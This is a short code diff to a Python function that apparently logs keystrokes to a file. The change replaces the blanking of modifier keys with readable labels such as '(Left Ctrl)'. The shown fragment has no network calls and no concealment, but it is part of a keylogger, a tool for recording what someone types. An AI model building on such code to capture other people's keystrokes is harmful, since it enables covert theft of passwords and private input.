@@ -4,8 +4,20 @@ def write_to_file(key):
     letter = str(key)
     letter = letter.replace("'", "")
 
-    if letter in ["Key.ctrl_l", "Key.ctrl_r", "Key.shift", "Key.shift_r", "Key.alt_l", "Key.alt_gr"]:
-        letter = ""
+    # if letter in ["Key.ctrl_l", "Key.ctrl_r", "Key.shift", "Key.shift_r", "Key.alt_l", "Key.alt_gr"]:
+    #     letter = ""
+    if letter == "Key.ctrl_l":
+        letter = " (Left Ctrl) "
+    elif letter == "Key.ctrl_r":
+        letter = " (Right Ctrl) "
+    elif letter == "Key.shift":
+        letter = " (Left Shift) "
+    elif letter == "Key.shift_r":
+        letter = " (Right Shift) "
+    elif letter == "Key.alt_l":
+        letter = " (Left Alt) "
+    elif letter == "Key.alt_gr":
+        letter = " (Right Alt) "
     elif letter == "Key.space":
         letter = " "
     elif letter == "Key.enter":
